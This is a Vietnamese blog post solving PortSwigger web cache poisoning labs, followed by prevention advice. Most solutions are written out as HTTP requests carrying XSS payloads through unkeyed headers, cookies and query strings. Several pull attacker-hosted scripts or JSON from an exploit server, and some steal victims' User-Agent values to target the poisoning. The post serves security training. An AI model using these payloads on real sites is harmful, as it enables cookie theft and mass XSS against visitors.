---
title: "[PortSwigger Lab] - Web Cache Poisoning"
description: Solution of Web Cache Poisoning Lab
date: 2025-06-26 10:55:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, web cache poisoning]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-26-portswigger-lab-web-cache-poisoning/web-cache-poisoning.png
    alt: Web Cache Poisoning
---

## Introduction
---
### **Web Cache Poisoning**
**Web Cache Poisoning** là một kỹ thuật tấn công nâng cao nhằm làm ô nhiễm **(poison)** bộ nhớ **cache** của **web server**, khiến những người dùng khác nhận được phản hồi độc hại từ **cache** thay vì phản hồi hợp lệ.

Kỹ thuật này diễn ra theo hai giai đoạn chính:
1. Tạo phản hồi độc hại:
Kẻ tấn công gửi một yêu cầu **HTTP** tới máy chủ chứa payload nguy hiểm (như mã **JavaScript**, **XSS**, **redirect**,...), và máy chủ vô tình tạo ra một phản hồi chứa **payload** đó.

2. Lưu phản hồi vào **cache**:
Kẻ tấn công cố gắng đảm bảo rằng phản hồi chứa **payload** sẽ được lưu vào bộ nhớ **cache**, từ đó các người dùng hợp lệ khác (nạn nhân) khi truy cập tài nguyên tương tự sẽ nhận được nội dung bị đầu độc.

### **Cache Key**
**Cache key** là tập hợp các phần của **HTTP request** mà **cache** dùng để xác định xem hai **request** có `"tương đương"` không. Ví dụ `GET /index.html`, `Header Host`

Các thành phần không nằm trong **cache key** được gọi là **unkeyed**  và thường bị bỏ qua bởi **cache**.

### **Constructing a web cache poisoning attack**

| Bước      | Nội dung                                           |
| --------- | -------------------------------------------------- |
| 🔍 Bước 1 | Tìm unkeyed input có ảnh hưởng đến phản hồi        |
| ⚠️ Bước 2 | Dùng input này để tạo ra phản hồi độc hại          |
| 💾 Bước 3 | Đảm bảo phản hồi đó được lưu vào cache và phát tán |

### **Web Cache Model**

```
┌──────────────┐
│    Browser   │
└──────┬───────┘
       │
       ▼
┌──────────────────────┐
│  CDN / Reverse Proxy │  <-- Đây là vị trí phổ biến của cache
│  (ví dụ: Cloudflare, │
│  Varnish, Nginx...)  │
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│      Web Server      │  (Apache, Nginx, Node.js, v.v.)
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│   Ứng dụng Backend   │  (Laravel, Django, Express,...)
└──────┬───────────────┘
       │
       ▼
┌──────────────────────┐
│       Database       │
└──────────────────────┘
```

| Vị trí                        | Vai trò                                                               | Công nghệ thường dùng                      |
| ----------------------------- | --------------------------------------------------------------------- | ------------------------------------------ |
| **CDN (Edge Cache)**        | Cache ở **biên mạng**, gần người dùng. Giảm độ trễ và tải về máy chủ. | Cloudflare, Akamai, Fastly                 |
| **Reverse Proxy Cache**     | Cache tại **máy chủ trung gian** (giữa client và backend)             | Nginx (with `proxy_cache`), Varnish        |
| **Application-level Cache** | Cache tại **ứng dụng** (RAM hoặc Redis)                               | Redis, Memcached                           |
| **Browser Cache**           | Trình duyệt người dùng tự cache tài nguyên                            | `Cache-Control`, `Expires`, `ETag` headers |

#### **Flow**
- **User** gửi **request** => qua **CDN** (ví dụ **Cloudflare**)
- **CDN** kiểm tra **cache**:
    - Nếu có phản hồi phù hợp => trả lại luôn (rất nhanh)
    - Nếu không có, **forward** đến **server**

- **Server** xử lý => trả về => **CDN** lưu vào **cache**
- Lần sau **user** khác truy cập => **CDN** trả lại phản hồi đã **cache**

### **Cache control**

| Header                    | Ý nghĩa                                                           |
| ------------------------- | ----------------------------------------------------------------- |
| `Cache-Control: public`   | Cho phép cache ở mọi nơi                                          |
| `Cache-Control: private`  | Chỉ cache trong **trình duyệt** người dùng                        |
| `Cache-Control: no-store` | **Không được cache ở đâu cả**                                     |
| `Cache-Control: no-cache` | Có thể lưu, nhưng **phải xác nhận lại với server trước khi dùng** |

## Solve Web Cache Poisoning Lab
---
### Lab: Web cache poisoning with an unkeyed header
#### Analysis
- Gửi request đến **Repeater** và gửi lại lần nữa => `X-Cache: hit` => đã được **cache**
- Quan sát ta thấy có **url** được **reflect** ở **response**

```html
<script type="text/javascript" src="//0abe0012046242fe80eb030200020044.web-security-academy.net/resources/js/tracking.js"></script>
```
- Gửi request với **cache-buster** để đảm bảo **cache** không ảnh hưởng (ép server phản hồi mới) => `X-Cache: miss`(lần 1) => `X-Cache: hit`(lần 2)
- Cho thấy cache sử dung **query strings** để làm **cache key**

```http
GET /?xnxx=pornhub HTTP/2
Host: 0abe0012046242fe80eb030200020044.web-security-academy.net
X-Forwarded-Host: exploit-0ac300cc04b14210805702c001750082.exploit-server.net
```
- Gửi **request** với header **X-Forwarded-Host: xnxx.com** => **reflect**

```html
<script type="text/javascript" src="//xnxx.com/resources/js/tracking.js"></script>
```
- Ứng dụng xử lý dựa vào **X-Forwarded-Host** để xác định **request** được đến từ đâu để **reflect** ra **HTML**

#### Exploit
- Thêm **script** sau vào **exploit server**, sửa đường dẫn thành `/resources/js/tracking.js` giống **reflect** của ứng dụng

```js
alert(document.cookie)
```
- Gửi request với **X-Forwarded-Host** là **url** của **exploit server**

```http
GET / HTTP/2
Host: 0abe0012046242fe80eb030200020044.web-security-academy.net
X-Forwarded-Host: exploit-0ac300cc04b14210805702c001750082.exploit-server.net
```
- Gửi cho đến khi thấy **reflect** **url** của **exploit server** hoặc `X-Cache: hit`

```html
<script type="text/javascript" src="//exploit-0ac300cc04b14210805702c001750082.exploit-server.net/resources/js/tracking.js"></script>
```
- **Refresh** trang => **XSS** xuất hiện

### Lab: Web cache poisoning with an unkeyed cookie
#### Analysis
- Truy cập trang 
- **Reload** trang => giá trị của cookie **fehost** được **reflect** vào **HTML**

```http
GET / HTTP/2
Host: 0afc00910330cd55800d677900d1002e.web-security-academy.net
Cookie: session=DzxU9OJ062HzX0ZI4tskdgfBdWo7zsUZ; fehost=prod-cache-01
```

```html
<script>
    data = {"host":"0afc00910330cd55800d677900d1002e.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
</script>
```
- Gửi **request** sang **Repeater** và thêm **cache-buster** vào để đảm bảo **cache** không ảnh hưởng (ép server phản hồi mới)
- Chèn payload XSS vào và gửi request

```http
GET /?xnxx HTTP/2
Host: 0afc00910330cd55800d677900d1002e.web-security-academy.net
Cookie: session=DzxU9OJ062HzX0ZI4tskdgfBdWo7zsUZ; fehost=xnxx"+alert(1)+"xnxx
```

```html
<script>
    data = {"host":"0afc00910330cd55800d677900d1002e.web-security-academy.net","path":"/","frontend":"xnxx"+alert(1)+"xnxx"}
</script>
```
- **Replay** cho đến khi thấy `X-Cache: hit` => **response** đã được **cache**
- **Reload** browser => **XSS** xảy ra

#### Exploit
- Gửi **request** không có **cache-buster**

```http
GET / HTTP/2
Host: 0afc00910330cd55800d677900d1002e.web-security-academy.net
Cookie: session=DzxU9OJ062HzX0ZI4tskdgfBdWo7zsUZ; fehost=xnxx"+alert(1)+"xnxx
```
- Vì **cache** có thể **expire (hết hạn)** trong vài giây hoặc phút => cần liên tục gửi lại **request** độc để giữ **payload** trong **cache**
- Khi **victim** truy cập **site**, họ sẽ nhận đúng bản phản hồi bị **poison** 

### Lab: Web cache poisoning with multiple headers
#### Analysis
- Truy cập trang 
- Quan sát ta thấy **script** có **src** đến `/resources/js/tracking.js`

```html
<script type="text/javascript" src="/resources/js/tracking.js"></script>
```
- Gửi **request** đến `/resources/js/tracking.js` qua **repeater**

```http
GET /resources/js/tracking.js HTTP/2
Host: 0ad30039049f7078828d796d00f300f4.web-security-academy.net
```
- Thêm header **X-Forwarded-Scheme** và **cache-buster** và gửi lại request

```http
GET /resources/js/tracking.js?xnxx HTTP/2
Host: 0ad30039049f7078828d796d00f300f4.web-security-academy.net
...
X-Forwarded-Scheme: http
```
- Nếu là `http` sẽ trả về **redirect (302)** sang `https`, nếu là `https` không **redirect** => **server** dựa vào **header** này để biết client kết nối qua **HTTP** hay **HTTPS**.

```http
HTTP/2 302 Found
Location: https://0ad30039049f7078828d796d00f300f4.web-security-academy.net/resources/js/tracking.js?xnxx
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```
- Tiếp tục gửi **request** với **X-Forwarded-Scheme**, **X-Forwarded-Host** và **cache-buster**

```http
GET /resources/js/tracking.js?xnxx HTTP/2
Host: 0ad30039049f7078828d796d00f300f4.web-security-academy.net
...
X-Forwarded-Scheme: http
X-Forwared-Host: xnxx.com
```
- **Backend** biết **host** gốc mà client đã yêu cầu thông qua **X-Forwarded-Host**
- Nhân được **redirect** đến **host** mà ta cung cấp

```http
HTTP/2 302 Found
Location: https://xnxx.com/resources/js/tracking.js?xnxx
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 24
X-Cache: hit
Content-Length: 0
```

#### Exploit
- Thêm **payload** vào **exloit server** và đổi tên thành `/resources/js/tracking.js`

```js
alert(document.cookie)
```
- Gửi **request** không có **cache-buster** đến khi `X-Cache: hit`

```http
GET /resources/js/tracking.js HTTP/2
Host: 0ad30039049f7078828d796d00f300f4.web-security-academy.net
...
X-Forwarded-Scheme: http
X-Forwared-Host: exploit-0adf00050466700582a178da0177004f.exploit-server.net
```

```http
HTTP/2 302 Found
Location: https://exploit-0adf00050466700582a178da0177004f.exploit-server.net/resources/js/tracking.js
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 17
X-Cache: hit
Content-Length: 0
```
- Khi người dùng truy cập trang `home`, `src="/resources/js/tracking.js"` sẽ được tải 
- Vì đã bị **poison** => nhận về **redirect** đến `/resources/js/tracking.js` của **exploit server** => **XSS** thực thi

### Lab: Targeted web cache poisoning using an unknown header
#### Analysis
- Truy cập trang 
- Quan sát **response** => `Vary: User-Agent` => ứng dụng dùng header `User-Agent` để làm **cache key** => Cần phải lấy được `User-Agent` của **victim** để **poison cache**
- Quan sát `/resources/js/loadComments.js` 
    - Khi truy cập 1 bài viết bất kì dữ liệu được tải xuống và được làm sạch **(sanitize)** bởi **DOMPurify**
    - Ứng dụng chỉ cho phép: `ALLOWED_TAGS: ['b', 'i', 'u', 'img', 'a'], ALLOWED_ATTR: ['src', 'href']` trong **body** của **comment**
- Quan sát ta thấy **script** có **src** đến `/resources/js/tracking.js`

```html
<script type="text/javascript" src="//0a7300210448d5c18022036c007b0063.h1-web-security-academy.net/resources/js/tracking.js"></script>
```
- Sử dụng **Param Miner** để quét
    - **Post** 1 **comment** bất kì => gửi **request** đến **Repeater**
    - Chuột phải > **Extension** > **Param Miner** > **Guess headers** để đoán **header**
    - **Extensions** > **Installed** > **Param Miner** > **Output** để quan sát kết quả
    - Ta thấy có header `X-Host` có ảnh hưởng.
- Gửi request có header `X-Host` 

```http
GET /post?postId=1 HTTP/1.1
Host: 0a7300210448d5c18022036c007b0063.h1-web-security-academy.net
...
X-Host: xnxx.com
```

```html
<script type="text/javascript" src="//xnxx.com/resources/js/tracking.js"></script>
```
- Ứng dụng sử dụng **header** `X-Host` nào đó để làm **absolute URL** cho **JS**

#### Exploit
- Thêm **payload** vào **exloit server** và đổi tên thành `/resources/js/tracking.js`

```js
alert(document.cookie)
```
- **Post comment** với **body** sau

```
<img src="https://exploit-0a4900250448d5f880d202290129000c.exploit-server.net">
```
- Khi **victim** truy cập **post** này 
    - **src** sẽ được **load** => **request** đến **exploit server**
    - Khi **request** đến **exploit server** => đính kèm `User-Agent` của **victim**
- Đến **log exploit server** => copy thông tin `User-Agent` của **victim**
- Gửi lại **request** sử dụng thông tin `User-Agent` của **victim** => vì **cache key** là `User-Agent` nên cần **fake** để tạo **cache** cho **victim**

```http
GET /post?postId=1 HTTP/1.1
Host: 0a7300210448d5c18022036c007b0063.h1-web-security-academy.net
X-Host: exploit-0a4900250448d5f880d202290129000c.exploit-server.net
...
X-Host: xnxx.com
```

```html
<script type="text/javascript" src="//exploit-0a4900250448d5f880d202290129000c.exploit-server.net/resources/js/tracking.js"></script>
```
- Gửi **request** đến khi `X-Cache: hit`
- Khi **victim** truy cập bài viết => tải **cache poison** => **src** được tải => **XSS** xảy ra

### Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
#### Analysis
- Truy cập trang 
- Quan sát **response** ta thấy các **script** đáng ngờ

```html
<script>
    data = {"host":"0a37000904c443d080e813bd003200d0.web-security-academy.net","path":"/"}
</script>

<script type="text/javascript" src="/resources/js/geolocate.js"></script>

<script>
    initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
</script>
```

```js
function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');

            let img = document.createElement("img");
            img.setAttribute("src", "/resources/images/localShipping.svg");
            geoLocateContent.appendChild(img)

            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country;
            geoLocateContent.appendChild(div)
        });
}
```
{:file="/resources/js/geolocate.js"}
- Sử dụng **Param Miner** để quét **unkeyed header** => xác định được **X-Forwarded-Host**
- Gửi lại **request** với header **X-Forwarded-Host** và **cache buster**

```http
GET /?abc HTTP/2
Host: 0a37000904c443d080e813bd003200d0.web-security-academy.net
X-Forwarded-Host: xnxx.com
```

```html
<script>
    data = {"host":"xnxx.com","path":"/"}
</script>
```

- Ta thấy **X-Forwarded-Host** đã **reflect** vào **HTML** khi dó nó sẽ gọi hàm
- Biến `data.host` bị ghi đè bởi **X-Forwarded-Host**

```html
<script>
    initGeoLocate('//' + 'xnxx.com' + '/resources/json/geolocate.json');
</script>
```
- Ứng dụng sẽ `fetch()` đến `//xnxx.com/resources/json/geolocate.json` và lấy thuộc tính `country` để gán trực tiếp vào **innerHTML**

```js
div.innerHTML = 'Free shipping to ' + j.country;
```

#### Exploit
- Dựng **JSON** độc hại trên **exploit server**

```json
{"country": "<img src=1 onerror=alert(document.cookie)>"}
```
- Đổi tên file thành `/resources/json/geolocate.json`
- Thêm header `Access-Control-Allow-Origin: *` vào header của **exploit server**
- Gửi lại request với giá trị của **X-Forwarded-Host** là url của **exploit server**

```http
GET / HTTP/2
Host: 0a37000904c443d080e813bd003200d0.web-security-academy.net
X-Forwarded-Host: exploit-0a8e008a04414340807a127701bf000a.exploit-server.net
```
- Gửi cho đến khi có dấu hiện đã được **cache**

```html
<script>
    data = {"host":"exploit-0a8e008a04414340807a127701bf000a.exploit-server.net","path":"/"}
</script>
```
- Khi đã được **cache** ứng dụng sẽ `fetch()` đến **exploit server** và hiển thị `j.country` ra **HTML** => **XSS** xảy ra
- Điều đặc biệt ở đây là phải thêm `Access-Control-Allow-Origin: *` vào header của **exploit server**
    - Vì khi sử dụng `fetch()` để lấy dữ liệu của trang khác **SOP (Same-Origin Policy)** sẽ ngắn chặn điều đó, nó chỉ cho tải tài nguyên của trang khác thông qua thuộc tính của thẻ **HTML** (ví dụ `src`,..) còn lại tải được nhưng không đọc được
    - Đây là cơ chế bảo mật của trình duyệt
    - **CORS (Cross Origin Resource Sharing)** sẽ nới lỏng cơ chế này khi **exploit server** trả về `Access-Control-Allow-Origin: *` => chấp nhận tất cả các trang khác tải về tài nguyên => **browser** cho phép trang hiện tại đọc tài nguyên được tải về
    - Nên khi dùng `fetch()` => trở nên hợp lệ

### Lab: Combining web cache poisoning vulnerabilities
#### Analysis
- Hoạt động tương tự lab trên nhưng khác ở **data** và cách xử lý chúng

```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "Ver detailes",
            "Description:": "Descripción:"
        }
    },
}
```
{:file="/resources/json/translations.json"}

```js
function initTranslations(jsonUrl)
{
    ...
    const translate = (dict, el) => {
        for (const k in dict) {
            if (el.innerHTML === k) {
                el.innerHTML = dict[k];
            } else {
                el.childNodes.forEach(el_ => translate(dict, el_));
            }
        }
    }
    ...
    lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
}
```
{:file="/resources/js/translations.js"}

- Sử dụng **Param Miner** để quét **unkeyed header** => xác định được **X-Forwarded-Host**, **X-Original-Url** có ảnh hưởng
- Đặt `X-Forwarded-Host: attacker.exploit-server.net`, **server** sẽ tải **JSON** từ:

```
http://attacker.exploit-server.net/resources/json/translations.json
```
- Đối với các ngôn ngữ khác `en` => thì sẽ được **translate** bằng cách gán lại nội dung của `"View details": "Ver detailes"` bằng `el.innerHTML = dict[k];`
- Lợi dụng điều này để inject **XSS** vào thuộc tính của ngôn ngữ

```json
{
    "en": {
        "name": "English"
    },
    "es": {
        "name": "español",
        "translations": {
            "Return to list": "Volver a la lista",
            "View details": "<img src=1 onerror=alert(document.cookie)>",
            "Description:": "Descripción:"
        }
    }
}
```
- Mặc định người dùng sử dụng `en` làm ngôn ngữ chính, nhưng để kích hoạt được sự kiện **translate** cần sử dụng ngôn ngữ khác `en` 
- Ta sử dụng **X-Original-Url: /setlang/es//** để **cache** khi người dùng truy cập vào ứng dụng sẽ **set** lại coookie `lang`
    - Sử dụng `//` đằng sau bởi vì nếu để bình thương `/setlang/es/` thì sẽ không được **cache** do có response chứa header **Set-Cookie** 
    - Ngoài ra có thể sử dụng **X-Original-Url: /setlang\es/** 
    - Việc làm trên để server **normalization** và **redirect** đến `/setlang/es` => không có header **Set-Cookie** => được **cache**

#### Exploit
- Gửi **request** để người dùng sử dụng **cache** chứa trường set lại **cookie** thành `es` để kích hoạt sự kiện **translate**

```http
GET / HTTP/2
Host: 0a63008703e2827980ba80c7004d0043.web-security-academy.net
X-Original-Url: /setlang/es\\
```

```http
HTTP/2 302 Found
Location: /setlang/es/
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 1
X-Cache: hit
Content-Length: 0
```
- Khi người dùng đã set được **lang=es** => gửi **request** để **cache** tải **json** từ **exploit server**
- Sự kiện **translate** được kích hoạt => `View details": "<img src=1 onerror=alert(document.cookie)>"` được gán => **XSS** xảy ra

```http
GET /?localized=1 HTTP/2
Host: 0a63008703e2827980ba80c7004d0043.web-security-academy.net
X-Forwarded-Host: exploit-0ab900b00394827c80d87f40015400ad.exploit-server.net
```
- Phải gửi đến `/?localized=1` vì sau khi **set lang** người dùng sẽ được **redirect** tới đó
- Cứ gửi 2 **request** trên liên tục để cả 2 đều `hit` bởi vì không biết người dùng truy cập lúc nào

### Lab: Web cache poisoning via an unkeyed query string
- Truy cập ứng dụng
- Gửi **request** đến **Repeater**, thêm **query string** và gửi lại

```http
GET /?abc HTTP/2
Host: 0a43005104ad20beda3c5184002d009e.web-security-academy.net
```

```http
X-Cache: hit
```
- Gửi **request** đến `/bcd` => `X-Cache: hit` cho thấy tất cả các **query** đều dùng chung 1 **cache** `/`
- Khi **cache** được với **query** `/?abc` ta thấy có **reflected** ra **HTML** (phải chuyển từ `miss` qua `hit`)

```html
<link rel="canonical" href='//0a43005104ad20beda3c5184002d009e.web-security-academy.net/?abc'/>
```
#### Exploit
- Tạo **query string** chứa payload **XSS**

```http
GET /?abc'><img+src=1+onerror='alert(1) HTTP/2
Host: 0a43005104ad20beda3c5184002d009e.web-security-academy.net
```
- Gửi **request** quan sát khi **cache** cũ đã hết thì **cache** này sẽ thay thế
- Ứng dụng sẽ **reflected** ra **HTML** => **XSS** xảy ra

```html
<link rel="canonical" href='//0a43005104ad20beda3c5184002d009e.web-security-academy.net/?abc'/>
<img src=1 onerror='alert(1)'/>
```
- Khi người dùng try cập `/`, **cache** của **cache key** sẽ được trả về

### Lab: Web cache poisoning via an unkeyed query parameter
#### Analysis
- Truy cập ứng dụng
- Gửi **request** đến **Repeater**, thêm **query string** và gửi lại
- Làm như cách trên thêm **query string** khác nhau => tạo **cache** khác nhau
- Dùng **Param miner** để quét **param unkeyed** 
    - Chuột phải > **Extensions** > **Param Miner** > **Unkeyed param** 
    - Ta tìm được **Unkeyed param** `utm_content`
- Quan sát **response** ta thấy có **reflected** ra **HTML**

```http
GET /post?postId=4&utm_content=abc HTTP/2
Host: 0ae3006c03810a86804b7bfc001200df.web-security-academy.net
```

```html
<link rel="canonical" href='//0ae3006c03810a86804b7bfc001200df.web-security-academy.net/post?postId=4&utm_content=abc'>
```
#### Exploit
- Tạo **query string** chứa payload **XSS**

```http
GET /post?postId=4&utm_content=abc'><img+src=1+onerror='alert() HTTP/2
Host: 0ae3006c03810a86804b7bfc001200df.web-security-academy.net
```
- Gửi **request** quan sát khi nào **cache** mới được tạo
- Ứng dụng sẽ **reflected** ra **HTML** => **XSS** xảy ra

```html
<link rel="canonical" href='//0ae3006c03810a86804b7bfc001200df.web-security-academy.net/post?postId=4&utm_content=abc'><img src=1 onerror='alert()'/>
```
- Khi người dùng try cập `/post?postId=4`, **cache** của **cache key** sẽ được trả về

## Prevent
---
1. Vô hiệu hóa **cache** nếu không cần thiết
    - Cách tốt nhất để ngăn **cache poisoning** là không sử dụng **cache**.
    - Nếu **website** của bạn chỉ dùng **cache** vì **CDN** bật mặc định, hãy đánh giá lại:
        - **Cache** có thực sự cần không?
        - Có đúng **cache** những nội dung tĩnh không?

    - **Ví dụ:** Nếu bạn dùng **Cloudflare** chỉ để giảm tải mà không cần **cache động** => hãy chuyển sang chế độ `"No Cache"` hoặc chỉ `"cache static files"`.

2. Chỉ **cache** nội dung thực sự tĩnh
    - Nếu cần dùng **cache**:
        - Chỉ nên **cache** nội dung hoàn toàn tĩnh (**HTML**, **JS**, **CSS**, **image**,... không thay đổi theo người dùng).
        - Tránh **cache** phản hồi từ **server** mà phụ thuộc vào **input** người dùng (ví dụ: **X-Forwarded-**, **query string**,...).

    - Đảm bảo **attacker** không thể:
        - Lừa **server** trả về phiên bản `"tĩnh"` do họ kiểm soát.
        - **Inject** nội dung động vào tài nguyên được **cache**.

3. Loại bỏ các header không cần thiết
    - Rất nhiều lỗ hổng bắt nguồn từ các **header** không nằm trong **cache key** nhưng lại ảnh hưởng phản hồi **(unkeyed inputs)**.
    - Vô hiệu hóa hoặc lọc các **header** không cần thiết như:
        - X-Forwarded-Host
        - X-Original-URL
        - X-Rewrite-URL
        - X-Forwarded-Scheme
        - Forwarded, Via, True-Client-IP,…

    - Nếu **header** không cần để **site** hoạt động, thì nên bị chặn hoặc bỏ qua.

4. Cấu hình **cache** cẩn thận
    - Không loại bỏ các thành phần khỏi **cache key** để tăng hiệu suất, trừ khi thực sự cần thiết.
    - Thay vào đó, hãy **rewrite request** để tránh tác dụng phụ.
    - Không chấp nhận `"fat GET requests"` (GET có body) - một số **hệ thống/ngôn ngữ backend** hoặc **framework** có thể cho phép điều này mặc định.
    - Xác định rõ các tham số nào ảnh hưởng đến phản hồi, và **cache** phải phụ thuộc vào chúng.

5. Quản lý rủi ro từ công nghệ bên thứ ba
    - Khi tích hợp **CDN**, **WAF**, hoặc **microservice** của bên khác:
        - Hiểu rõ cách họ xử lý **cache** và các **header**.
        - Đọc kỹ cấu hình mặc định (nhiều dịch vụ hỗ trợ các **header** lạ mà bạn không biết).
    - Bạn chỉ an toàn bằng điểm yếu nhất trong hệ thống - kể cả nếu phần **backend** bạn đã bảo mật tốt.

6. Vá các lỗ hổng **frontend** - kể cả tưởng chừng không nguy hiểm
    - Một lỗi **XSS** nhỏ trong trang bị **cache** có thể thành tấn công diện rộng nếu bị **cache poisoning** lợi dụng.
    - Các hành vi `"bất thường"` của **cache** có thể khiến những lỗ hổng tưởng như không khai thác được trở nên khai thác được.

---
Goodluck! 🍀🍀🍀 

